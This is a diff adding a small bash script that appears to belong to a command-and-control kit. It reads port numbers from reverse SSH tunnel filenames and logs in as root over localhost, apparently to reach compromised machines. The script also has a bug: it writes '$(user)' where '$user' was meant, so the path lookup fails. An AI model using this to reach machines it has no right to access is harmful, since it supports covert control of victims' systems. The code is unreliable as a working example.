@@ -1,0 +1,17 @@
+#!/bin/bash
+
+# Chagne to C2 username
+user='CHANGEME'
+
+arr=($(ls /home/$(user)/ssh_tunnels | tr "_" "\n"))
+
+len="${#arr[@]}"
+
+for (( i=0; i<$len; i++ ))
+do
+	if [[ ${arr[i]} == *"ssh"* ]]; then
+		port=${arr[i-1]}
+	fi
+done
+
+ssh -p $port -i /home/$user/.ssh/id_rsa root@localhost
